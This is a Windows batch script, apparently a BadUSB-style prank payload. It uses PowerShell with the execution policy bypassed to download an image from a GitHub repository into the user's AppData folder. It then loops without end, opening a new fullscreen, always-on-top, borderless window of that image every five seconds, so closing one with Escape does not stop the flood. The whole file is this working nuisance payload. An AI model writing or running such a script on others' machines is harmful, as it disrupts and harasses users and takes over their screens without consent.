@echo off
setlocal

set "IMG_PATH=%APPDATA%\crineson.png"

:: Download image if missing
if not exist "%IMG_PATH%" (
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/rubitoutducky/main/crineson.png' -OutFile '%IMG_PATH%'"
)

:loop
:: Open image in separate PowerShell STA process
start "" powershell -NoProfile -ExecutionPolicy Bypass -STA -Command ^
"Add-Type -AssemblyName System.Windows.Forms; ^
Add-Type -AssemblyName System.Drawing; ^
$img='%IMG_PATH%'; ^
$form=New-Object System.Windows.Forms.Form; ^
$form.TopMost=$true; ^
$form.FormBorderStyle='None'; ^
$form.WindowState='Maximized'; ^
$pb=New-Object System.Windows.Forms.PictureBox; ^
$pb.Image=[System.Drawing.Image]::FromFile($img); ^
$pb.SizeMode='StretchImage'; ^
$pb.Dock='Fill'; ^
$form.Controls.Add($pb); ^
$form.KeyPreview=$true; ^
$form.Add_KeyDown({if ($_.KeyCode -eq 'Escape') {$form.Close()}}); ^
$form.ShowDialog()"

timeout /t 5 /nobreak >nul
goto loop
